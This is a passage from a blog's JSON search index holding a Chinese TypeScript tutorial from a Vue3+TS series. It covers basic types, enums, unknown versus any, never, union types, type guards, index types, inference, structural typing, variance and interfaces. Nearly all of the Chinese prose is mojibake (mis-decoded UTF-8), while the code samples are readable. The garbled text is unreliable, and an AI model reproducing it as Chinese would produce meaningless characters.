æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/vue3-composition-api-and-main-attrs/","summary":"\u003cp\u003eæœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ï¼Œä¼š\u0026hellip;\u003c/p\u003e","title":"vue3+ts(3)ï¼švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´"},{"content":"æœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ï¼Œå…³äºTypeScriptçš„åŸºç¡€è¯­æ³•ï¼Œä½ äº†è§£\u0026hellip;\nä¸€ã€èƒŒæ™¯ åœ¨ reactÂ å’Œ vueÂ ç¤¾åŒºä¸­ä¹Ÿè¶Šæ¥è¶Šå¤šäººå¼€å§‹ä½¿ç”¨TypeScriptï¼Œä½¿ç”¨ TS å¯ä»¥å¢åŠ ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ä»å‘å¸ƒçš„ Vue3Â æ­£å¼ç‰ˆæœ¬æ¥çœ‹ï¼Œ Vue3Â çš„æºç æ˜¯ç”¨ TS ç¼–å†™çš„ï¼Œæ›´å¥½çš„ TypeScript æ”¯æŒä¹Ÿæ˜¯è¿™æ¬¡å‡çº§çš„ä¸€å¤§äº®ç‚¹ã€‚å½“ç„¶ï¼Œåœ¨å®é™…å¼€å‘ä¸­å¦‚ä½•æ­£ç¡®æ‹¥æŠ± TS ä»¥åŠå¦‚ä½•è¿ç§»åˆ° Vue3Â ä¹Ÿæ˜¯é¡¹ç›®ä¸­æˆ‘ä»¬ä¸å¾—ä¸é¢å¯¹çš„é—®é¢˜ï¼Œè¿™é‡Œé’ˆå¯¹ Vue3Â å’Œ TSå•ç‹¬åšäº†ä¸€ä¸ªç³»åˆ—å’Œå¤§å®¶åšä¸€ä¸‹äº¤æµï¼Œæœ¬ç¯‡æ˜¯ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ã€‚\næœ¬ç³»åˆ—å…¶ä»–å†…å®¹å¦‚ä¸‹:\nvue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ äºŒã€å‰è¨€ 1ã€é™æ€ç±»å‹ã€åŠ¨æ€ç±»å‹ã€å¼ºç±»å‹ã€å¼±ç±»å‹ ç¼–è¯‘æ—¶å°±çŸ¥é“å˜é‡ç±»å‹çš„æ˜¯é™æ€ç±»å‹ï¼Œè¿è¡Œæ—¶æ‰çŸ¥é“ä¸€ä¸ªå˜é‡ç±»å‹çš„å«åšåŠ¨æ€ç±»å‹ã€‚ java æ˜¯é™æ€ç±»å‹ï¼Œ js æ˜¯åŠ¨æ€ç±»å‹ã€‚\nä¸å…è®¸éšå¼è½¬æ¢çš„æ˜¯å¼ºç±»å‹ï¼Œå…è®¸éšå¼è½¬æ¢çš„æ˜¯å¼±ç±»å‹ã€‚ java æ˜¯å¼ºç±»å‹ï¼Œ js æ˜¯å¼±ç±»å‹ã€‚\né‚£tsåˆ°åº•æ˜¯ä»€ä¹ˆç±»å‹çš„è¯­è¨€ï¼Œå¾ˆæ˜æ˜¾ï¼Œ ts æ˜¯é™æ€ç±»å‹è¯­è¨€ï¼Œå› ä¸ºå®ƒéœ€è¦ç»è¿‡ç¼–è¯‘ã€‚ä½†æ˜¯ tsä¸æ˜¯å¼ºç±»å‹ï¼Œå› ä¸ºå®ƒå¯ä»¥å…è®¸éšå¼ç±»å‹è½¬æ¢ã€‚\nlet isBool: boolean let num: number = 10 isBool = !num // ok 2ã€Typescriptæ˜¯ä»€ä¹ˆ ECMAScript çš„è¶…é›† (stage 3) ç¼–è¯‘æœŸçš„ç±»å‹æ£€æŸ¥ ä¸å¼•å…¥é¢å¤–å¼€é”€(é›¶ä¾èµ–ï¼Œä¸æ‰©å±• js è¯­æ³•ï¼Œä¸ä¾µå…¥è¿è¡Œæ—¶) ç¼–è¯‘å‡ºé€šç”¨çš„ã€æ˜“è¯»çš„ js ä»£ç  Typescript = Type + ECMAScript + Babel-Lite\nTypescript è®¾è®¡ç›®æ ‡: é“¾æ¥\n3ã€ä¸ºä»€ä¹ˆä½¿ç”¨ Typescript å¢åŠ äº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ å‡å°‘è¿è¡Œæ—¶é”™è¯¯ï¼Œå†™å‡ºçš„ä»£ç æ›´åŠ å®‰å…¨ï¼Œå‡å°‘ BUG äº«å—åˆ°ä»£ç æç¤ºå¸¦æ¥çš„å¿«æ„Ÿ é‡æ„ç¥å™¨ ä¸‰ã€ç±»å‹ 1ã€åŸºç¡€ç±»å‹ å£°æ˜äº†å˜é‡çš„ç±»å‹ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡å°±æœ‰äº†é™æ€ç±»å‹çš„ç‰¹æ€§ï¼Œtsä¸­ä½¿ç”¨:æ“ä½œç¬¦æ¥å£°æ˜ç±»å‹:\nboolean number string array tupleï¼ˆå…ƒç»„ï¼‰ enumï¼ˆæšä¸¾ï¼‰ any \u0026amp; unknown void null \u0026amp; undefined never Object å£°æ˜å˜é‡çš„ç±»å‹:\nlet bool: boolean = false // boolean ç±»å‹ let num: number = 12 // number ç±»å‹ let str: string = \u0026#39;hello world\u0026#39; // stringç±»å‹ let numArr: number[] = [1, 2, 3] // numberæ•°ç»„ç±»å‹ let numArr: Array\u0026lt;number\u0026gt; = [1, 2, 3] // æ•°ç»„æ³›å‹å½¢å¼ï¼šnumberæ•°ç»„ç±»å‹ let unknow: any = 4 // anyç±»å‹ï¼Œå³ä»»ä¸€ç±»å‹ unknow = \u0026#34;maybe a string instead\u0026#34; unknow = false 1.1 æšä¸¾ï¼ˆenumï¼‰ æ•°å­—æšä¸¾ å­—ç¬¦ä¸²æšä¸¾ å¸¸é‡æšä¸¾ å¾ˆå¤šç¼–ç¨‹è¯­è¨€éƒ½æœ‰æšä¸¾çš„æ¦‚å¿µï¼Œæšä¸¾å°±æ˜¯ä¸€ç»„å¸¸é‡çš„é›†åˆï¼Œä½†æ˜¯å’Œé›†åˆä¸åŒï¼Œæšä¸¾å¯ä»¥é€šè¿‡å˜é‡çš„å€¼æ¥å¾—åˆ°å˜é‡ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒå‘çš„è¿‡ç¨‹:\nenum Direction { UP, DOWN, LEFT, RIGHT } Direction.UP // 0 Direction[0] // \u0026#39;UP\u0026#39; æ•°å­—æšä¸¾ ä¸Šä¾‹ä¸­çš„ Direction å°±æ˜¯ä¸€ä¸ªæ•°å­—æšä¸¾ï¼Œé»˜è®¤çš„ï¼Œç¬¬ä¸€ä¸ªå˜é‡çš„å€¼æ˜¯0ï¼Œåé¢çš„å€¼ä¼šåœ¨å‰ä¸€ä¸ªå€¼ä¸Š +1 ï¼Œæ‰€ä»¥ DOWN çš„å€¼ä¸º1ï¼Œ LEFT çš„å€¼ä¸º2ï¼Œä»¥æ­¤ç±»æ¨ã€‚ å¦‚æœæƒ³æ”¹å˜æšä¸¾çš„åˆå§‹å€¼ï¼Œåªéœ€è¦ç»™ç¬¬ä¸€ä¸ªå˜é‡èµ‹å€¼å³å¯:\nenum Direction { UP = 1, DOWN, LEFT, RIGHT } å­—ç¬¦ä¸²æšä¸¾ å­—ç¬¦ä¸²æšä¸¾çš„æ¦‚å¿µå¾ˆç®€å•ï¼Œ åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æšä¸¾é‡Œï¼Œæ¯ä¸ªæˆå‘˜éƒ½å¿…é¡»åˆå§‹åŒ–:\nå¦‚æœæŸä¸ªæˆå‘˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™ä¼šæŠ¥é”™\nenum Direction { UP = \u0026#39;UP\u0026#39;, DOWN = \u0026#39;DOWN\u0026#39;, LEFT = \u0026#39;LEFT\u0026#39;, RIGHT = \u0026#39;RIGHT\u0026#39;, MIDDLE //error æšä¸¾æˆå‘˜å¿…é¡»å…·æœ‰åˆå§‹åŒ–è¡¨è¾¾å¼ } å¸¸é‡æšä¸¾ å¯ä»¥ç”¨ const ä¿®é¥°ç¬¦æ¥å£°æ˜æšä¸¾ï¼Œè¿™æ—¶å€™ç¼–è¯‘åçš„jsä»£ç å°†ä¸ä¼šå‡ºç°é¢å¤–çš„å£°æ˜ä»£ç :\nenum Direction { UP, DOWN, LEFT, RIGHT } const enum Seasons { SPRING = \u0026#39;SPRING\u0026#39;, SUMMER = \u0026#39;SUMMER\u0026#39;, AUTUMN = \u0026#39;AUTUMN\u0026#39;, WINTER = \u0026#39;WINTER\u0026#39; } const up = Direction.UP const spring = Seasons.SPRING ç”Ÿæˆçš„js:\nvar Direction; (function (Direction) { Direction[Direction[\u0026#34;UP\u0026#34;] = 0] = \u0026#34;UP\u0026#34;; Direction[Direction[\u0026#34;DOWN\u0026#34;] = 1] = \u0026#34;DOWN\u0026#34;; Direction[Direction[\u0026#34;LEFT\u0026#34;] = 2] = \u0026#34;LEFT\u0026#34;; Direction[Direction[\u0026#34;RIGHT\u0026#34;] = 3] = \u0026#34;RIGHT\u0026#34;; })(Direction || (Direction = {})); var up = Direction.UP; var spring = \u0026#34;SPRING\u0026#34; /* SPRING */; 1.2 any å’Œ unknown çš„åŒºåˆ« any : ä»»æ„ç±»å‹ unknown : æœªçŸ¥çš„ç±»å‹ ä»»ä½•ç±»å‹éƒ½èƒ½åˆ†é…ç»™ unknown ï¼Œä½† unknown ä¸èƒ½åˆ†é…ç»™å…¶ä»–åŸºæœ¬ç±»å‹ï¼Œè€Œ any å•¥éƒ½èƒ½åˆ†é…å’Œè¢«åˆ†é…\nunknown Demo:\nlet foo: unknown foo = true // ok foo = 123 //ok foo.toFixed(2) // error let foo1: string = foo // error any Demo:\nlet bar: any bar = true // ok bar = 123 //ok foo.toFixed(2) // ok let bar1:string = bar // ok å¦‚ä¸Šï¼Œç”¨äº† any å°±ç›¸å½“äºå®Œå…¨ä¸¢å¤±äº†ç±»å‹æ£€æŸ¥ï¼Œæ‰€ä»¥å°½é‡å°‘ç”¨ any ï¼Œå¯¹äºæœªçŸ¥ç±»å‹å¯ä»¥ç”¨ unknown\nunknown çš„æ­£ç¡®ç”¨æ³• å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼å°† unknown ç±»å‹ç¼©å°ä¸ºæ›´å…·ä½“çš„ç±»å‹èŒƒå›´:\nfunction getLen(value: unknown): number { if (typeof value === \u0026#39;string\u0026#39;) { // å› ä¸ºç±»å‹ä¿æŠ¤çš„åŸå› ï¼Œæ­¤å¤„ value è¢«åˆ¤æ–­ä¸º string ç±»å‹ return value.length } return 0 } è¿™ä¸ªè¿‡ç¨‹å«ç±»å‹æ”¶çª„(type narrowing)\n1.3 never never ç±»å‹è¡¨ç¤ºçš„æ˜¯é‚£äº›æ°¸ä¸å­˜åœ¨çš„å€¼çš„ç±»å‹ã€‚ neverç±»å‹æ˜¯é‚£äº›æ€»æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸æˆ–æ ¹æœ¬å°±ä¸ä¼šæœ‰è¿”å›å€¼çš„å‡½æ•°è¡¨è¾¾å¼æˆ–ç®­å¤´å‡½æ•°è¡¨è¾¾å¼çš„è¿”å›å€¼ç±»å‹ï¼›å˜é‡ä¹Ÿå¯èƒ½æ˜¯ neverç±»å‹ï¼Œå½“å®ƒä»¬è¢«æ°¸ä¸ä¸ºçœŸçš„ç±»å‹ä¿æŠ¤æ‰€çº¦æŸæ—¶ã€‚\nnever ç±»å‹æ˜¯ä»»ä½•ç±»å‹çš„å­ç±»å‹ï¼Œä¹Ÿå¯ä»¥èµ‹å€¼ç»™ä»»ä½•ç±»å‹ æ²¡æœ‰ç±»å‹æ˜¯neverçš„å­ç±»å‹æˆ–å¯ä»¥èµ‹å€¼ç»™neverç±»å‹ï¼ˆé™¤äº†neveræœ¬èº«ä¹‹å¤–ï¼‰ï¼Œå³ä½¿ anyä¹Ÿä¸å¯ä»¥èµ‹å€¼ç»™never\nåœ¨æœ€æ–°çš„ typescript 3.7 ä¸­ï¼Œä¸‹é¢ä»£ç ä¼šæŠ¥é”™:\n// never ç”¨æˆ·æ§åˆ¶æµåˆ†æ function neverReach (): never { throw new Error(\u0026#39;an error\u0026#39;) } const x = neverReach() x.toFixed(2) // x is unreachable never è¿˜å¯ä»¥ç”¨äºè”åˆç±»å‹çš„å¹ºå…ƒ:\ntype T0 = string | number | never // T0 is string | number 2ã€é«˜çº§ç±»å‹ 2.1 è”åˆç±»å‹ä¸äº¤å‰ç±»å‹ è”åˆç±»å‹(union type)è¡¨ç¤ºå¤šç§ç±»å‹çš„ â€œæˆ–â€ å…³ç³»\nfunction genLen(x: string | any[]) { return x.length } genLen(\u0026#39;\u0026#39;) // ok genLen([]) // ok genLen(1) // error äº¤å‰ç±»å‹è¡¨ç¤ºå¤šç§ç±»å‹çš„ â€œä¸â€ å…³ç³»\ninterface Person { name: string age: number } interface Animal { name: string color: string } const x: Person \u0026amp; Animal = { name: \u0026#39;x\u0026#39;, age: 1, color: \u0026#39;red } ä½¿ç”¨è”åˆç±»å‹è¡¨ç¤ºæšä¸¾\ntype Position = \u0026#39;UP\u0026#39; | \u0026#39;DOWN\u0026#39; | \u0026#39;LEFT\u0026#39; | \u0026#39;RIGHT\u0026#39; const position: Position = \u0026#39;UP\u0026#39; // å…·å€¼è”åˆç±»å‹ // type å…³é”®è¯å¯ä»¥å£°æ˜ä¸€ä¸ªç±»å‹ type positionType = \u0026#39;top\u0026#39; | \u0026#39;center\u0026#39; | \u0026#39;bottom\u0026#39; let position: positionType = \u0026#39;top\u0026#39; // ok position = \u0026#39;left\u0026#39; // error ä¸èƒ½å°†ç±»å‹â€œ\u0026#34;left\u0026#34;â€åˆ†é…ç»™ç±»å‹â€œpositionTypeâ€ position = \u0026#39;bottom\u0026#39; // ok // æ•°ç»„è”åˆç±»å‹ let arr: (number | string)[] = [] arr.push(1) // ok arr.push(\u0026#39;hello\u0026#39;) // ok arr.push(true) // error ç±»å‹â€œtrueâ€çš„å‚æ•°ä¸èƒ½èµ‹ç»™ç±»å‹â€œstring | numberâ€çš„å‚æ•°ã€‚ å¯ä»¥é¿å…ä½¿ç”¨ enum ä¾µå…¥äº†è¿è¡Œæ—¶ã€‚\n2.2 ç±»å‹ä¿æŠ¤å’Œç±»å‹æ–­è¨€ ts åˆå­¦è€…å¾ˆå®¹æ˜“å†™å‡ºä¸‹é¢çš„ä»£ç :\nfunction isString (value) { return Object.prototype.toString.call(value) === \u0026#39;[object String]\u0026#39; } function fn (x: string | number) { if (isString(x)) { return x.length // error ç±»å‹â€œstring | numberâ€ä¸Šä¸å­˜åœ¨å±æ€§â€œlengthâ€ã€‚ } else { // ..... } } å¦‚ä½•è®© ts æ¨æ–­å‡ºæ¥ x æ˜¯ string ç±»å‹å‘¢?\n2.2.1 ä½¿ç”¨tsçš„ is å…³é”®è¯ function isString (value: unknown): value is string { return Object.prototype.toString.call(value) === \u0026#39;[object String]\u0026#39; } function fn (x: string | number) { if (isString(x)) { return x.length } else { // ..... } } 2.2.2 ç±»å‹ä¿æŠ¤ (1) js typeof å…³é”®è¯ typeof å…³ç³»è¯å¯ä»¥ä»å®ç° æ¨å‡ºç±»å‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»å‹å…³é”®è¯\nfunction getLen(x: string | any[]) { return x.length } type GetLen = typeof getLen function callback(fn: GetLen) { fn(1) // ç±»å‹â€œ1â€çš„å‚æ•°ä¸èƒ½èµ‹ç»™ç±»å‹â€œstring | any[]â€çš„å‚æ•° } (2) js instanceof å…³é”®è¯ åœ¨ ts ä¸­ï¼Œinstanceof å…³é”®è¯èƒ½å¤Ÿå¸®åŠ© ts åˆ¤æ–­å‡ºæ„é€ å‡½æ•°çš„ç±»å‹:\nfunction fn1 (x: XMLHttpRequest | string) { if (x instanceof XMLHttpRequest) { // x is XMLHttpRequest return x.getAllResponseHeaders() } else { // x is string return x.length } } (3) é’ˆå¯¹ null å’Œ undefined çš„ç±»å‹ä¿æŠ¤ åœ¨æ¡ä»¶åˆ¤æ–­ä¸­ï¼Œts ä¼šè‡ªåŠ¨å¯¹ null å’Œ undefined è¿›è¡Œç±»å‹ä¿æŠ¤:\nfunction fn2 (x?: string) { if (x) { return x.length } } 2.2.3 ç±»å‹æ–­è¨€ (1) é’ˆå¯¹ null å’Œ undefined çš„ç±»å‹æ–­è¨€ å¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“çš„å‚æ•°ä¸ä¸ºç©ºï¼Œå¯ä»¥ä½¿ç”¨!æ¥æ‰‹åŠ¨æ ‡è®°:\nfunction fn2 (x?: string) { return x!.length } 2.3 ç´¢å¼•ç±»å‹ï¼ˆIndex typesï¼‰ keyof in [] (1) keyof keyof ä¹Ÿæ˜¯ä¸€ä¸ª ç±»å‹å…³é”®è¯ ï¼Œå¯ä»¥ç”¨æ¥å–å¾—ä¸€ä¸ªå¯¹è±¡æ¥å£çš„æ‰€æœ‰ key å€¼:\ninterface Person { name: string age: number } type PersonAttrs = keyof Person // \u0026#39;name\u0026#39; | \u0026#39;age\u0026#39; (2) in in ä¹Ÿæ˜¯ä¸€ä¸ª ç±»å‹å…³é”®è¯ ï¼Œå¯ä»¥å¯¹ è”åˆç±»å‹ è¿›è¡Œéå†ï¼Œåªå¯ä»¥ç”¨åœ¨ type å…³é”®è¯ä¸‹é¢ã€‚\ntype Person = { [key in \u0026#39;name\u0026#39; | \u0026#39;age\u0026#39;]: number } // ===\u0026gt; type Person = { name: number; age: number; } (3) [] ä½¿ç”¨ [] æ“ä½œç¬¦å¯ä»¥è¿›è¡Œç´¢å¼•è®¿é—®ï¼Œä¹Ÿæ˜¯ä¸€ä¸ª ç±»å‹å…³é”®è¯\ninterface Person { name: string age: number } type x = Person[\u0026#39;name\u0026#39;] // x is string ç¤ºä¾‹ å†™ä¸€ä¸ªç±»å‹å¤åˆ¶çš„ç±»å‹å·¥å…·:\ntype Copy\u0026lt;T\u0026gt; = { [key in keyof T]: T[key] } interface Person { name: string age: number } type Person1 = Copy\u0026lt;Person\u0026gt; 3ã€ç±»å‹æ¨æ–­ ts ä¸­çš„ç±»å‹æ¨æ–­æ˜¯éå¸¸å¼ºå¤§ï¼Œè€Œä¸”å…¶å†…éƒ¨å®ç°ä¹Ÿæ˜¯éå¸¸å¤æ‚çš„ã€‚\nåŸºæœ¬ç±»å‹æ¨æ–­:\n// ts æ¨å¯¼å‡º x æ˜¯ number ç±»å‹ let x = 10 å¯¹è±¡ç±»å‹æ¨æ–­:\n// ts æ¨æ–­å‡º myObj çš„ç±»å‹: myObj: { x: number; y: string; z: boolean; const myObj = { x:1, y: \u0026#39;2\u0026#39;, z: true } å‡½æ•°ç±»å‹æ¨æ–­:\n// ts æ¨å¯¼å‡ºå‡½æ•°è¿”å›å€¼æ˜¯ number ç±»å‹ function len (str: string) { return str.length } ä¸Šä¸‹æ–‡ç±»å‹æ¨æ–­:\n// ts æ¨å¯¼å‡º event æ˜¯ ProgressEvent ç±»å‹ const xhr = new XMLHttpRequest() xhr.onload = function (event) {} å†™ ts ä»£ç çš„æ—¶å€™ï¼Œå¯¹äºåŸºæœ¬ç±»å‹æˆ‘ä»¬å¯ä»¥ä¸ç”¨æ‰‹åŠ¨å£°æ˜å…¶ç±»å‹ï¼Œè®© ts è‡ªå·±å»æ¨æ–­\nçŸ¥ä¹ - typescriptä¸Šä¸‹æ–‡ç›¸å…³ç±»å‹æµ…æ https://zhuanlan.zhihu.com/p/84481228\n4ã€ç±»å‹å…¼å®¹æ€§ typescript çš„å­ç±»å‹æ˜¯åŸºäº ç»“æ„å­ç±»å‹ çš„ï¼Œåªè¦ç»“æ„å¯ä»¥å…¼å®¹ï¼Œå°±æ˜¯å­ç±»å‹ã€‚(Duck Type)\nclass Point { x: number } function getPointX(point: Point) { return point.x } class Point2 { x: number } let point2 = new Point2() getPointX(point2) // OK java ã€ c++ ç­‰ä¼ ç»Ÿé™æ€ç±»å‹è¯­è¨€æ˜¯åŸºäº åä¹‰å­ç±»å‹ çš„ï¼Œå¿…é¡»æ˜¾ç¤ºå£°æ˜å­ç±»å‹å…³ç³»(ç»§æ‰¿)ï¼Œæ‰å¯ä»¥å…¼å®¹ã€‚\npublic class Main { public static void main (String[] args) { getPointX(new Point()); // ok getPointX(new ChildPoint()); // ok getPointX(new Point1()); // error } public static void getPointX (Point point) { System.out.println(point.x); } static class Point { public int x = 1; } static class Point2 { public int x = 2; } static class ChildPoint extends Point { public int x = 3; } } 4.1 å¯¹è±¡å­ç±»å‹ å­ç±»å‹ä¸­å¿…é¡»åŒ…å«æºç±»å‹æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•:\nfunction getPointX(point: { x: number }) { return point.x } const point = { x: 1, y: \u0026#39;2\u0026#39; } getPointX(point) // OK æ³¨æ„ï¼Œå¦‚æœç›´æ¥ä¼ å…¥ä¸€ä¸ªå¯¹è±¡å­—é¢é‡æ˜¯ä¼šæŠ¥é”™çš„:\nfunction getPointX(point: { x: number }) { return point.x } getPointX({ x: 1, y: \u0026#39;2\u0026#39; }) // error è¿™æ˜¯ ts ä¸­çš„å¦ä¸€ä¸ªç‰¹æ€§ï¼Œå«åš: excess property check ï¼Œå½“ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡å­—é¢é‡æ—¶ï¼Œä¼šè¿›è¡Œé¢å¤–å±æ€§æ£€æŸ¥ã€‚\n4.2 åå˜ä¸é€†å˜ ä»‹ç»ç±»å‹å…¼å®¹å’Œç±»å‹å®‰å…¨å°±éå¸¸æœ‰å¿…è¦ä»‹ç»ä¸€ä¸‹é€†å˜ä¸åå˜çš„æ¦‚å¿µ:\nåœ¨ä»‹ç»ä¹‹å‰ï¼Œå…ˆçº¦å®šå¦‚ä¸‹æ ‡è®°:\nA â‰¼ B è¡¨ç¤ºAæ˜¯Bçš„å­ç±»å‹ï¼ŒAåŒ…å«Bçš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚ A =\u0026gt; B è¡¨ç¤ºä»¥ A ä¸ºå‚æ•°ï¼ŒB ä¸ºè¿”å›å€¼çš„æ–¹æ³•ã€‚ (param: A) =\u0026gt; B ä¸€ä¸ªé—®é¢˜ å¦‚æœæˆ‘ç°åœ¨æœ‰ä¸‰ä¸ªç±»å‹ Animal ã€ Dog ã€ WangCai(æ—ºè´¢) ï¼Œé‚£ä¹ˆè‚¯å®šå­˜åœ¨ä¸‹é¢çš„å…³ç³»: WangCai â‰¼ Dog â‰¼ Animal å³ æ—ºè´¢å±äºç‹—å±äºåŠ¨ç‰©ã€‚\né—®é¢˜:ä»¥ä¸‹å“ªç§ç±»å‹æ˜¯ Dog =\u0026gt; Dog çš„å­ç±»å‘¢?\nWangCai =\u0026gt; WangCai WangCai =\u0026gt; Animal Animal =\u0026gt; Animal Animal =\u0026gt; WangCai ä»ä»£ç æ¥çœ‹ class Animal { sleep: Function } class Dog extends Animal { // å  bark: Function } class WangCai extends Dog { dance: Function } type DogCbFn = (dog: Dog) =\u0026gt; Dog function getDogName (cb: DogCbFn) { const dog = new Dog() const myDog = cb(dog) myDog.bark() } const animal = new Animal() const wangcai = new WangCai() getDogName(wangcai =\u0026gt; { wangcai.dance() return wangcai }) // error getDogName(wangcai =\u0026gt; { wangcai.dance() return animal }) // error getDogName(animal =\u0026gt; { animal.sleep() return wangcai }) // ok getDogName(animal =\u0026gt; { animal.sleep() return animal }) // error å¯ä»¥çœ‹åˆ°åªæœ‰ Animal =\u0026gt; WangCai æ‰æ˜¯ Dog =\u0026gt; Dog çš„å­ç±»å‹ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªç»“è®ºï¼Œå¯¹äºå‡½æ•°ç±»å‹æ¥è¯´ï¼Œå‡½æ•°å‚æ•°çš„ç±»å‹å…¼å®¹æ˜¯åå‘çš„ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º é€†å˜ ï¼Œè¿”å›å€¼çš„ç±»å‹å…¼å®¹æ˜¯æ­£å‘çš„ï¼Œç§°ä¹‹ä¸º åå˜ ã€‚\n(1) å‡½æ•°å­ç±»å‹ ä¸Šé¢é€†å˜ä¸åå˜çš„ä¾‹å­ä»‹ç»äº†å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ªæ—¶çš„æƒ…å†µï¼Œå¦‚æœå‡½æ•°å‚æ•°æœ‰å¤šä¸ªæ—¶è¯¥å¦‚ä½•åŒºåˆ†?\nå…¶å®å‡½æ•°çš„å‚æ•°å¯ä»¥è½¬åŒ–ä¸º Tuple çš„ç±»å‹å…¼å®¹æ€§:\ntype Tuple1 = [string, number] type Tuple2 = [string, number, boolean] let tuple1: Tuple1 = [\u0026#39;1\u0026#39;, 1] let tuple2: Tuple2 = [\u0026#39;1\u0026#39;, 1, true] let t1: Tuple1 = tuple2 // ok let t2: Tuple2 = tuple1 // error å¯ä»¥çœ‹åˆ° Tuple2 =\u0026gt; Tuple1 ï¼Œå³é•¿åº¦å¤§çš„æ˜¯é•¿åº¦å°çš„å­ç±»å‹ï¼Œå†ç”±äºå‡½æ•°å‚æ•°çš„é€†å˜ç‰¹æ€§ï¼Œæ‰€ä»¥å‡½æ•°å‚æ•°å°‘çš„å¯ä»¥èµ‹å€¼ç»™å‚æ•°å¤šçš„(å‚æ•°ä»å‰å¾€åéœ€ä¸€ä¸€å¯¹åº”):\n[1, 2].forEach((item, index) =\u0026gt; { console.log(item) }) // ok [1, 2].forEach((item, index, arr, other) =\u0026gt; { console.log(other) }) // error å››ã€æ¥å£ å†™è¿‡javaçš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“æ¥å£çš„æ¦‚å¿µï¼Œjavaä¸­çš„æ¥å£æ˜¯ç”¨æ¥æè¿°ç±»çš„åŠŸèƒ½çš„\ninterface BabyInter { void cry(); } class Baby implements BabyInter { @Override public void cry() { System.out.print(\u0026#34;crying\u0026#34;) } } ä½†æ˜¯tsé‡Œé¢çš„æ¥å£è¿˜æ˜¯æœ‰ä¸€ç‚¹ä¸ä¸€æ ·çš„ï¼ŒåŒæ ·æ˜¯ç”¨æ¥æè¿°æ•°æ®çš„ç»“æ„ï¼Œtsçš„æ¥å£ä¸ä»…å¯ä»¥æè¿°ç±»ï¼Œè¿˜å¯ä»¥æè¿°å˜é‡ï¼Œæè¿°æ–¹æ³•, ä½¿ç”¨interfaceå…³é”®è¯æ¥å£°æ˜æ¥å£:\ninterface BabyInter { name: string, cry () : void } let baby: BabyInter = { name: \u0026#39;apple\u0026#39;, cry () : void { console.log(this.name + \u0026#39;is crying\u0026#39;) } } let getBaby = () : BabyInter =\u0026gt; { return { name: \u0026#39;apple\u0026#39;, cry () {} } } 1ã€å¯é€‰å±æ€§ æ¥å£é‡Œçš„å±æ€§ä¸å…¨éƒ½æ˜¯å¿…éœ€çš„ï¼Œå¯ä»¥æ˜¯å¯é€‰çš„ã€‚\ninterface FontStyleOptions { size: number; color?: string; } const getFontStyle = (options: FontStyleOptions) =\u0026gt; { options.color = options.color || \u0026#39;#000000\u0026#39; return options } const fontStyle = getFontStyle({ size: 16 }) å¯é€‰å±æ€§çš„å¥½å¤„ä¹‹ä¸€æ˜¯å¯ä»¥å¯¹å¯èƒ½å­˜åœ¨çš„å±æ€§è¿›è¡Œé¢„å®šä¹‰ï¼Œå¥½å¤„ä¹‹äºŒæ˜¯åœ¨å¼•ç”¨äº†ä¸å­˜åœ¨çš„å±æ€§æ—¶å¯ä»¥æ•è·é”™è¯¯ã€‚\n2ã€å¯ç´¢å¼•çš„ç±»å‹ é¢å¤–çš„å±æ€§æ£€æŸ¥ å¦‚æœFontStyleOptionsæ¥å£ä¸­é™¤äº†æœ‰sizeå±æ€§ï¼Œè¿˜æœ‰ä¸€äº›ä¸ç¡®å®šçš„å…¶å®ƒå±æ€§ï¼Œé‚£ä¹ˆå¯ä»¥è¿™æ ·å®šä¹‰å®ƒ:\ninterface FontStyleOptions { size: number; [prop: string]: number; } let obj: FontStyleOptions = { size: 16, border: 1 } obj.height = 18 // ok obj.background = \u0026#39;#ffffff\u0026#39; // error ä¸èƒ½å°†ç±»å‹â€œ\u0026#34;#ffffff\u0026#34;â€åˆ†é…ç»™ç±»å‹â€œnumberâ€ 